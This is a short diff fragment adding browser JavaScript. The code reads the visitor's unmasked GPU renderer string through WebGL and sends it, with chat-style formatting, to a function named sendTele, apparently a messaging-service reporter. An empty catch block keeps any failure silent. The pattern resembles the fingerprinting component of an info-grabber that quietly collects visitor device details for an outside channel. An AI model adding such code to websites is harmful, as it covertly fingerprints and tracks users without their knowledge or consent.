@@ -1,0 +1,2 @@
+try{let c=document.createElement('canvas'),g=c.getContext('webgl'),d=g.getExtension('WEBGL_debug_renderer_info');sendTele("**[◈] GPU**\n• Renderer: "+g.getParameter(d.UNMASKED_RENDERER_WEBGL)+"\n**▒░░░▒░░░░░░░░░░░░░░░░░░░▒░░░▒**");}catch(e){}
+ 
